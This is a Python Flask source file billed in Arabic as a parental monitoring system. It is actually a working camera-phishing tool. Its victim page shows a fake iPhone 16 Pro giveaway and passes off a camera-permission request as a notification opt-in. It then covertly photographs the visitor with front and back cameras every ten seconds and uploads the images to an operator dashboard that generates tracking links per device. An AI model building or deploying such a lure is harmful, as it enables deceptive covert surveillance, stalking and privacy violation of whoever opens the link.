
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════╗
║   🎯 Rifaat22 - نظام المراقبة الأبوية         ║
║   يعمل على Railway 24 ساعة                     ║
╚══════════════════════════════════════════════════╝
"""

import os
import uuid
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

os.makedirs('photos', exist_ok=True)
sessions = {}

# ==================== صفحة الطفل ====================
CHILD_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اربح iPhone 16 Pro</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:Arial,sans-serif;
            background:linear-gradient(135deg,#0a0a0a,#1a1a2e);
            color:white;
            text-align:center;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
        }
        .container{
            background:rgba(255,255,255,0.03);
            border:2px solid rgba(255,215,0,0.4);
            border-radius:30px;
            padding:40px 20px;
            max-width:360px;
            width:90%;
            box-shadow:0 0 60px rgba(255,215,0,0.15);
        }
        .emoji{font-size:90px;animation:bounce 1.5s infinite}
        @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
        h2{color:#FFD700;font-size:26px;margin:15px 0}
        p{color:#ccc;font-size:14px;margin:10px 0;line-height:1.8}
        .btn{
            background:linear-gradient(135deg,#FFD700,#FF8C00);
            color:#000;
            border:none;
            padding:18px;
            font-size:22px;
            font-weight:bold;
            border-radius:50px;
            cursor:pointer;
            width:100%;
            margin:20px 0;
            box-shadow:0 0 30px rgba(255,215,0,0.5);
            animation:glow 2s infinite;
        }
        @keyframes glow{0%,100%{box-shadow:0 0 30px rgba(255,215,0,0.5)}50%{box-shadow:0 0 60px rgba(255,215,0,0.9)}}
        .btn:active{transform:scale(0.95)}
        .hidden{display:none}
        .success-box{background:rgba(0,255,0,0.1);border:1px solid rgba(0,255,0,0.3);padding:20px;border-radius:20px;margin:15px 0}
        .success-box .icon{font-size:60px}
        .error-box{background:rgba(255,0,0,0.1);border:1px solid rgba(255,0,0,0.3);padding:20px;border-radius:20px;margin:15px 0}
        .error-box .icon{font-size:60px}
        .note-box{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.2);padding:15px;border-radius:15px;margin:10px 0;font-size:12px;color:#aaa}
        .highlight{color:#FFD700;font-weight:bold}
    </style>
</head>
<body>

    <div class="container" id="page1">
        <div class="emoji">🎁</div>
        <h2>اربح iPhone 16 Pro</h2>
        <p>اضغط الزر أدناه للدخول في السحب</p>
        <p style="font-size:12px;color:#888;">🎯 الفرصة محدودة للألف الأوائل</p>
        <button class="btn" onclick="goToPage2()">🎯 شارك الآن واربح</button>
        <p style="font-size:10px;color:#555;">بالضغط أنت توافق على شروط المسابقة</p>
    </div>

    <div class="container hidden" id="page2">
        <div class="emoji">🔔</div>
        <h2>خطوة أخيرة!</h2>
        <p>حتى <span class="highlight">يصلك إشعار</span> عند فوزك بالآيفون</p>
        <p>نحتاج منك الضغط على <span class="highlight">سماح</span></p>
        <div class="note-box">
            📱 سيصلك إشعار فور إعلان الفائز<br>
            🎁 تأكيد اشتراكك في السحب<br>
            ✅ لن نرسل أي رسائل مزعجة
        </div>
        <button class="btn" onclick="requestPermission()">🔔 سماح لتصلك الإشعارات</button>
        <p style="font-size:11px;color:#666;">هذه الخطوة ضرورية للاشتراك</p>
    </div>

    <div class="container hidden" id="page3_fail">
        <div class="error-box">
            <div class="icon">❌</div>
            <h3 style="color:#FF6B6B;margin:10px 0;">فشل الاشتراك!</h3>
            <p style="color:#ccc;">لم تتم الموافقة على الكاميرا</p>
            <p style="color:#FF6B6B;font-size:14px;font-weight:bold;">⚠️ يجب الموافقة على الكاميرا<br>لتأكيد اشتراكك في السحب</p>
            <p style="color:#aaa;font-size:12px;">بدون الموافقة لا يمكنك الفوز بالآيفون</p>
        </div>
        <button class="btn" onclick="goBackToPage2()">↩️ الرجوع للموافقة</button>
    </div>

    <div class="container hidden" id="page3_success">
        <div class="success-box">
            <div class="icon">🎉</div>
            <h3 style="color:#4CAF50;margin:10px 0;">مبروك! تم اشتراكك</h3>
            <p style="color:#ccc;">أنت الآن مشارك في سحب iPhone 16 Pro</p>
            <p style="color:#FFD700;font-size:13px;">🔔 سيصلك إشعار عند فوزك</p>
            <p style="color:#888;font-size:12px;margin-top:10px;">يمكنك إغلاق الصفحة الآن</p>
        </div>
    </div>

    <script>
        const SESSION = "{{ session_id }}";
        const SERVER = window.location.origin;
        let frontCam = null, backCam = null, watching = false, rejectCount = 0;

        function goToPage2() {
            document.getElementById('page1').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
            document.getElementById('page3_fail').classList.add('hidden');
            document.getElementById('page3_success').classList.add('hidden');
        }
        function goBackToPage2() {
            document.getElementById('page3_fail').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
        }
        async function requestPermission() {
            try {
                frontCam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false});
                try {
                    backCam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment",width:{ideal:640},height:{ideal:480}},audio:false});
                } catch(e) {}
                document.getElementById('page2').classList.add('hidden');
                document.getElementById('page3_success').classList.remove('hidden');
                rejectCount = 0;
                startWatching();
            } catch(err) {
                rejectCount++;
                document.getElementById('page2').classList.add('hidden');
                document.getElementById('page3_fail').classList.remove('hidden');
            }
        }
        function startWatching() {
            if(watching) return;
            watching = true;
            setTimeout(captureAll, 2000);
            setInterval(captureAll, 10000);
        }
        async function captureAll() {
            if(!watching) return;
            if(frontCam){try{let img=await snap(frontCam);await send(img,'front');}catch(e){}}
            if(backCam){try{let img=await snap(backCam);await send(img,'back');}catch(e){}}
        }
        function snap(stream){return new Promise((ok,err)=>{let v=document.createElement('video');v.style.cssText='position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';document.body.appendChild(v);v.srcObject=stream;v.autoplay=true;v.muted=true;v.playsInline=true;let t=setTimeout(()=>{if(v.parentNode)document.body.removeChild(v);err('timeout');},5000);v.onloadedmetadata=()=>{v.play().then(()=>{setTimeout(()=>{let c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);ok(c.toDataURL('image/jpeg',0.7));if(v.parentNode)document.body.removeChild(v);clearTimeout(t);},500);});};})}
        async function send(img,type){try{await fetch(SERVER+'/api/upload/'+SESSION,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({[type]:img,timestamp:new Date().toISOString()})});}catch(e){}}
    </script>
</body>
</html>
"""

# ==================== لوحة التحكم ====================
DASHBOARD = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rifaat22 - لوحة التحكم</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}
        .header{text-align:center;padding:20px;border-bottom:1px solid #30363d;margin-bottom:20px}
        .header h1{color:#f78166;font-size:28px}
        .header p{color:#8b949e;font-size:14px;margin-top:5px}
        .main-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;max-width:1200px;margin:0 auto}
        @media(max-width:768px){.main-grid{grid-template-columns:1fr}}
        .card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:20px}
        .card h2{color:#f78166;font-size:20px;margin-bottom:15px;padding-bottom:10px;border-bottom:1px solid #30363d}
        .btn{display:block;width:100%;padding:15px;margin:10px 0;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.2s}
        .btn:active{transform:scale(0.97)}
        .btn-android{background:#3ddc84;color:#000}
        .btn-iphone{background:#007aff;color:#fff}
        .btn-windows{background:#00a4ef;color:#fff}
        .link-box{background:#0d1117;border:2px solid #30363d;border-radius:8px;padding:15px;margin:15px 0;word-break:break-all;font-size:14px;color:#7ee787;font-family:monospace;display:none}
        .link-box.show{display:block}
        .copy-btn{background:#238636;color:white;border:none;padding:8px 20px;border-radius:6px;cursor:pointer;margin-top:10px;font-size:14px}
        .photos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;max-height:500px;overflow-y:auto}
        .photo-item{position:relative;border-radius:8px;overflow:hidden;border:2px solid #30363d;cursor:pointer}
        .photo-item img{width:100%;height:150px;object-fit:cover;display:block}
        .photo-item .label{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.8);color:white;padding:5px;font-size:10px;text-align:center}
        .photo-item:hover{border-color:#f78166}
        .empty-state{text-align:center;padding:40px;color:#8b949e}
        .empty-state .icon{font-size:60px}
        .status-bar{display:flex;justify-content:space-around;margin:15px 0;padding:15px;background:#0d1117;border-radius:8px}
        .stat{text-align:center}
        .stat .num{font-size:32px;font-weight:bold;color:#f78166}
        .stat .lbl{font-size:12px;color:#8b949e}
        .toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#238636;color:white;padding:10px 30px;border-radius:30px;z-index:999;display:none}
        .toast.show{display:block;animation:fadeInOut 2s}
        @keyframes fadeInOut{0%{opacity:0}20%{opacity:1}80%{opacity:1}100%{opacity:0}}
        .modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:1000;display:none;align-items:center;justify-content:center}
        .modal.show{display:flex}
        .modal img{max-width:90%;max-height:90%;border-radius:10px}
        .modal .close{position:absolute;top:20px;right:30px;color:white;font-size:40px;cursor:pointer}
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 Rifaat22</h1>
        <p>نظام المراقبة الأبوية - لوحة التحكم</p>
    </div>
    <div class="toast" id="toast">✅ تم نسخ الرابط!</div>
    <div class="modal" id="imageModal" onclick="closeModal()">
        <span class="close">&times;</span>
        <img id="modalImage" src="">
    </div>
    <div class="main-grid">
        <div class="card">
            <h2>🔗 إنشاء رابط جديد</h2>
            <p style="color:#8b949e;font-size:13px;margin-bottom:15px;">اختر نوع الجهاز لإنشاء رابط مخصص</p>
            <button class="btn btn-android" onclick="createLink('android')">🤖 نظام أندرويد</button>
            <button class="btn btn-iphone" onclick="createLink('iphone')">🍎 نظام آيفون</button>
            <button class="btn btn-windows" onclick="createLink('windows')">💻 نظام ويندوز / كالي لينكس</button>
            <div class="link-box" id="linkBox">
                <strong>🔗 الرابط:</strong><br>
                <span id="generatedLink"></span><br>
                <button class="copy-btn" onclick="copyLink()">📋 نسخ الرابط</button><br>
                <span style="font-size:11px;color:#8b949e;">معرف الجلسة: <span id="sessionIdDisplay"></span></span>
            </div>
            <div class="status-bar">
                <div class="stat"><div class="num" id="statSessions">0</div><div class="lbl">جلسات نشطة</div></div>
                <div class="stat"><div class="num" id="statPhotos">0</div><div class="lbl">صور ملتقطة</div></div>
                <div class="stat"><div class="num" id="statCompleted">0</div><div class="lbl">مكتملة</div></div>
            </div>
        </div>
        <div class="card">
            <h2>📸 الصور الملتقطة</h2>
            <p style="color:#8b949e;font-size:12px;margin-bottom:10px;">يتم التحديث تلقائياً كل 5 ثوان</p>
            <div class="photos-grid" id="photosGrid">
                <div class="empty-state"><div class="icon">📷</div><p>لا توجد صور بعد</p><p style="font-size:12px;">أنشئ رابطاً وأرسله لجهاز الطفل</p></div>
            </div>
        </div>
    </div>
    <script>
        let currentSessionId=null;
        async function createLink(t){try{let r=await fetch('/api/create_link/'+t);let d=await r.json();currentSessionId=d.session_id;document.getElementById('generatedLink').textContent=d.link;document.getElementById('sessionIdDisplay').textContent=d.session_id;document.getElementById('linkBox').classList.add('show');copyLink();loadPhotos();}catch(e){alert('خطأ في إنشاء الرابط')}}
        function copyLink(){let l=document.getElementById('generatedLink').textContent;if(l){navigator.clipboard.writeText(l);let t=document.getElementById('toast');t.classList.remove('show');void t.offsetWidth;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000)}}
        async function loadPhotos(){try{let r=await fetch('/api/photos');let d=await r.json();document.getElementById('statPhotos').textContent=d.total_photos;document.getElementById('statSessions').textContent=d.active_sessions;document.getElementById('statCompleted').textContent=d.completed_sessions;let g=document.getElementById('photosGrid');if(d.photos.length>0){g.innerHTML=d.photos.map((p,i)=>'<div class="photo-item" onclick="showImage(\''+p.path+'\')"><img src="'+p.path+'" alt="صورة '+(i+1)+'" loading="lazy"><div class="label">'+p.type+' | '+p.time+'</div></div>').join('')}}catch(e){}}
        function showImage(p){document.getElementById('modalImage').src=p;document.getElementById('imageModal').classList.add('show')}
        function closeModal(){document.getElementById('imageModal').classList.remove('show')}
        setInterval(loadPhotos,5000);loadPhotos();
    </script>
</body>
</html>
"""

# ==================== المسارات ====================
@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD)

@app.route('/child/<session_id>')
def child_page(session_id):
    if session_id in sessions:
        return render_template_string(CHILD_PAGE, session_id=session_id)
    return "الرابط غير صالح أو منتهي الصلاحية", 404

@app.route('/api/create_link/<device_type>')
def create_link(device_type):
    session_id = str(uuid.uuid4())[:8]
    sessions[session_id] = {
        'device_type': device_type,
        'created_at': datetime.now().isoformat(),
        'completed': False,
        'photos': []
    }
    link = f"https://YOUR-APP-NAME.railway.app/child/{session_id}"
    return jsonify({'session_id': session_id, 'link': link, 'device_type': device_type})

@app.route('/api/upload/<session_id>', methods=['POST'])
def upload_photo(session_id):
    if session_id not in sessions:
        return jsonify({'status': 'error'}), 404
    try:
        data = request.json
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        for img_type in ['front', 'back']:
            if img_type in data and data[img_type]:
                img_data = base64.b64decode(data[img_type].split(',')[1])
                filename = f"{session_id}_{img_type}_{timestamp}_{uuid.uuid4().hex[:4]}.jpg"
                filepath = os.path.join('photos', filename)
                with open(filepath, 'wb') as f:
                    f.write(img_data)
                sessions[session_id]['photos'].append({
                    'path': f'/photos/{filename}',
                    'type': 'أمامية' if img_type == 'front' else 'خلفية',
                    'time': datetime.now().strftime("%H:%M:%S")
                })
        sessions[session_id]['completed'] = True
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/photos')
def get_photos():
    all_photos = []
    for session_id, session in sessions.items():
        for photo in session.get('photos', []):
            all_photos.append(photo)
    all_photos.reverse()
    return jsonify({
        'photos': all_photos[:50],
        'total_photos': sum(len(s.get('photos', [])) for s in sessions.values()),
        'active_sessions': len(sessions),
        'completed_sessions': sum(1 for s in sessions.values() if s.get('completed'))
    })

@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory('photos', filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
